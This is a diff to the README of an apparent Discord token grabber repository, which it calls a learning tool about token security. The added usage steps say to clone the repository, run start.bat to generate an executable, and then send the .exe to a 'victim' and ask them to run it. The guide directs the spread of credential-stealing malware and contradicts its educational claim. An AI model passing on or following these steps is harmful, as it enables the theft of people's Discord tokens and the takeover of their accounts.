@@ -7,12 +7,19 @@
 
 This repository contains a Discord token grabber designed to help you learn about security vulnerabilities related to token management and how to better protect against them.
 
+# Requirments
+- A Windows PC
+- Discord Server (you have to be the owner/admin of the server)
+
 ## Usage
-1. Clone the Repository
+1. Clone the Repository or download the file on your **__WINDOWS__** PC.
    ```bash
    git clone https://github.com/ECCclient/Token.git
 
 2. Run the `start.bat` file and follow the instructions there.
+
+3. When a executable is generated, send the .exe file to a victim and ask to execute the file.
+4. 
 
 ## License
 
